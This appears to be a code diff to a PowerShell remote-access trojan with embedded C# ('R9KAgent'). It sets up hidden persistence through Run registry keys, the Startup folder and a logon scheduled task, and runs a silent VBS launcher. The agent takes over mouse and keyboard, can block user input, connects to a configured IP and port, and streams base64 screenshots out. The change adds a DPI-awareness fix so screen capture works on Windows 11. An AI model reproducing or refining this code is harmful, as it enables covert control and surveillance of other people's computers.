@@ -22,19 +22,16 @@ if ($args -notcontains "-silent") {
     
     $cmd = "wscript.exe //B //Nologo `"$vbsPath`""
     
-    # 1. Registro (Roda no login do usuário)
     try {
         Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name $installName -Value $cmd -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 2. Pasta Startup
     try {
         $startup = [Environment]::GetFolderPath('Startup')
         Copy-Item $vbsPath "$startup\$installName.vbs" -Force -ErrorAction SilentlyContinue
     } catch {}
 
-    # 3. Agendador de Tarefas (Rodando como USUÁRIO, não SYSTEM, para ter acesso à tela)
     try {
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
         $trigger1 = New-ScheduledTaskTrigger -AtLogOn
@@ -72,6 +69,7 @@ if (-not ("R9KAgent" -as [type])) {
         [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
         [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
         [DllImport("user32.dll")] public static extern bool BlockInput(bool fBlockIt);
+        [DllImport("user32.dll")] public static extern bool SetProcessDPIAware(); // CORREÇÃO WINDOWS 11
 
         static string IP;
         static int PORT;
@@ -86,6 +84,8 @@ if (-not ("R9KAgent" -as [type])) {
 
         public static void Start(string ip, int port) {
             IP = ip; PORT = port;
+            
+            try { SetProcessDPIAware(); } catch {} // Força o Windows 11 a capturar a tela corretamente
             
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
@@ -190,7 +190,6 @@ if (-not ("R9KAgent" -as [type])) {
                             lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                             Thread.Sleep(30); 
                         } else {
-                            // Se a tela ainda não estiver pronta, espera um pouco mais
                             Thread.Sleep(100);
                         }
                     } else { Thread.Sleep(50); }
